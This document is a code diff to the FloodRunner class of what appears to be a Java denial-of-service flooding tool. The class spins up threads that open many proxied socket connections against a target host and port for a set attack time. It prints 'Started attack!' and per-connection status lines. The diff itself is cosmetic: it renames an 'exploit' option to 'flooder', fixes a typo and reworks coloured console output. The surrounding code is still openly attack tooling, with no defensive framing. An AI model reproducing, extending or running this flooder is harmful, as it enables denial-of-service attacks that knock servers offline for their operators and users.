@@ -1,11 +1,13 @@
 package me.michaeldevc.flood;
 
 
+import me.michaeldevc.helper.ConsoleCoders;
 import me.michaeldevc.helper.SRVResolver;
 import me.michaeldevc.network.SocketHttp;
 import me.michaeldevc.option.Options;
 import me.michaeldevc.proxy.Proxies;
 
+import java.io.Console;
 import java.io.DataOutputStream;
 import java.lang.reflect.Method;
 import java.net.InetAddress;
@@ -53,7 +55,7 @@ public class FloodRunner {
         int attackTime = ((Integer)this.options.getOption("attackTime", 30));
         boolean srvResolve2 = ((Boolean)this.options.getOption("srvResolve2", false));
         boolean keepAlive = ((Boolean)this.options.getOption("keepAlive", true));
-        String floodName = String.valueOf(this.options.getOption("exploit", "1"));
+        String floodName = String.valueOf(this.options.getOption("flooder", "1"));
         boolean removeFailure = ((Boolean)this.options.getOption("removeFailure", false));
         Flooders.LOOP_AMOUNT = ((Integer)this.options.getOption("loopAmount", 1500));
 
@@ -76,7 +78,7 @@ public class FloodRunner {
         }
         if (srvResolve2)
             try {
-                String latest = "unkown";
+                String latest = "unknown";
                 byte b;
                 int i;
                 InetAddress[] arrayOfInetAddress;
@@ -113,13 +115,14 @@ public class FloodRunner {
             System.out.println("Attack finished.");
             System.exit(-1);
         })).start();
+
         ExecutorService executorService = Executors.newFixedThreadPool(threads);
-        System.out.println("Started attack! " + host + ":" + port + ", method: " +
-                "\033[34m" + floodName + "\033[0m" + "," +
-                " threads: " + threads + ", time attack: " + attackTime);
+        System.out.format("%sStarted attack! %s:%s, flooder: %s, threads: %s, attack: %s%s", ConsoleCoders.ANSI_GREEN, host, port, floodName, threads, attackTime, ConsoleCoders.ANSI_RESET);
+
         this.maxConnections = threads * connections;
         String finalServerName = host;
         int finalPort = port;
+
         for (int j = 0; j < threads; j++) {
             executorService.submit(() -> {
                 try {
@@ -156,7 +159,7 @@ public class FloodRunner {
                             out.flush();
                             this.connections++;
                             if (srvResolve2)
-                                System.out.println("CONNECTED \033[31m" + newServerName + ":" + newServerPort + "\033[0m" + " | " + "\033[36m" + proxy.address().toString() + "\033[0m" + " x" + this.connections);
+                                System.out.format("%sCONNECTED %s%s:%s | %s x%s%s", ConsoleCoders.ANSI_GREEN, ConsoleCoders.ANSI_CYAN, newServerName, newServerPort, proxy.address().toString(), this.connections, ConsoleCoders.ANSI_RESET);
                             if (!keepAlive)
                                 socket.close();
                         } catch (Exception ex) {
